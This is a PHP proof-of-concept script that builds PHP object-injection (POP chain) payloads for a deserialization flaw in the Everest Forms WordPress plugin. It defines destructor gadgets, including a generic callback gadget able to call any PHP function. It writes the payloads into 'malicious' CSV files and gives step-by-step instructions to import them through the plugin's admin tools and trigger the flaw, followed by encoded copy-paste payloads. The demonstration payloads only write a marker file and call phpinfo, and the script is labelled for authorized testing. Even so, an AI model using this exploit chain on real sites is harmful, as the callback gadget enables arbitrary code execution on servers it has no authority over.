<?php
/**
 * Everest Forms POP Injection Payload Generator
 * 
 * This script generates serialized payloads for testing the CVE chain:
 * - CVE: https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3
 * - CVE: https://wpscan.com/vulnerability/b90d6420-0de1-42cd-aee2-2473a757a320
 * 
 * FOR EDUCATIONAL/AUTHORIZED TESTING PURPOSES ONLY
 */

echo "==============================================\n";
echo "Everest Forms POP Injection Payload Generator\n";
echo "==============================================\n\n";

// ============================================
// GADGET 1: Simple File Write PoC
// ============================================

/**
 * Simple gadget that writes a marker file when deserialized
 */
class SimpleFileWriteGadget {
    public $file = '/tmp/evf_poc_marker.txt';
    public $content = 'POP chain triggered!';
    
    public function __destruct() {
        @file_put_contents($this->file, $this->content . ' - ' . date('Y-m-d H:i:s'));
    }
}

$gadget1 = new SimpleFileWriteGadget();
$payload1 = serialize($gadget1);

echo "[Gadget 1] Simple File Write PoC\n";
echo "--------------------------------\n";
echo "Description: Creates /tmp/evf_poc_marker.txt when deserialized\n";
echo "Payload:\n$payload1\n\n";

// ============================================
// GADGET 2: Using scssphp StreamLogger
// ============================================

// Mimicking the scssphp StreamLogger structure
namespace ScssPhp\ScssPhp\Logger {
    class StreamLogger {
        private $stream;
        private $closeOnDestruct;
        
        public function __construct($stream = null, $closeOnDestruct = true) {
            $this->stream = $stream;
            $this->closeOnDestruct = $closeOnDestruct;
        }
    }
}

namespace {
    // This would need the actual scssphp library loaded to work
    echo "[Gadget 2] scssphp StreamLogger (Concept)\n";
    echo "-----------------------------------------\n";
    echo "Note: Requires scssphp classes to be loaded\n";
    echo "This gadget can manipulate file streams on destruct\n\n";
    
    // ============================================
    // GADGET 3: WordPress/PHP Native Gadgets
    // ============================================
    
    echo "[Gadget 3] Generic Detection Payload\n";
    echo "------------------------------------\n";
    
    // A generic class that many PHP apps have similar structures to
    class GenericCallback {
        public $callback;
        public $args = array();
        
        public function __destruct() {
            if (is_callable($this->callback)) {
                call_user_func_array($this->callback, $this->args);
            }
        }
    }
    
    // Create a payload that would call phpinfo() if the class exists
    $gadget3 = new GenericCallback();
    $gadget3->callback = 'phpinfo';
    $gadget3->args = array();
    $payload3 = serialize($gadget3);
    
    echo "Payload (calls phpinfo if class exists):\n$payload3\n\n";
    
    // ============================================
    // CSV FILE GENERATOR
    // ============================================
    
    echo "==============================================\n";
    echo "CSV File Generator\n";
    echo "==============================================\n\n";
    
    function generateCSV($payload, $filename) {
        $csv_content = "\"field_value\"\n";
        $csv_content .= "\"" . addslashes($payload) . "\"\n";
        
        $filepath = __DIR__ . '/' . $filename;
        file_put_contents($filepath, $csv_content);
        echo "Generated: $filename\n";
        return $filepath;
    }
    
    // Generate CSV files with different payloads
    generateCSV($payload1, 'malicious_simple.csv');
    generateCSV($payload3, 'malicious_callback.csv');
    
    echo "\n";
    
    // ============================================
    // USAGE INSTRUCTIONS
    // ============================================
    
    echo "==============================================\n";
    echo "Usage Instructions\n";
    echo "==============================================\n\n";
    
    echo "1. IMPORT MALICIOUS CSV:\n";
    echo "   - Go to: WordPress Admin → Everest Forms → Tools → Import Entries\n";
    echo "   - Select your target form\n";
    echo "   - Upload one of the generated CSV files\n";
    echo "   - Map the 'field_value' column to a form field\n";
    echo "   - Click 'Import Entries'\n\n";
    
    echo "2. TRIGGER THE VULNERABILITY:\n";
    echo "   - Go to: Everest Forms → Entries\n";
    echo "   - Select the form containing the imported entry\n";
    echo "   - Click 'View' on the imported entry\n";
    echo "   - Check /tmp/evf_poc_marker.txt for the trigger confirmation\n\n";
    
    echo "3. VERIFY TRIGGER:\n";
    echo "   $ cat /tmp/evf_poc_marker.txt\n";
    echo "   Expected output: 'POP chain triggered! - [timestamp]'\n\n";
    
    // ============================================
    // MANUAL PAYLOAD FOR COPY-PASTE
    // ============================================
    
    echo "==============================================\n";
    echo "Copy-Paste Payloads\n";
    echo "==============================================\n\n";
    
    echo "Simple PoC (URL-safe):\n";
    echo urlencode($payload1) . "\n\n";
    
    echo "Simple PoC (Base64):\n";
    echo base64_encode($payload1) . "\n\n";
}
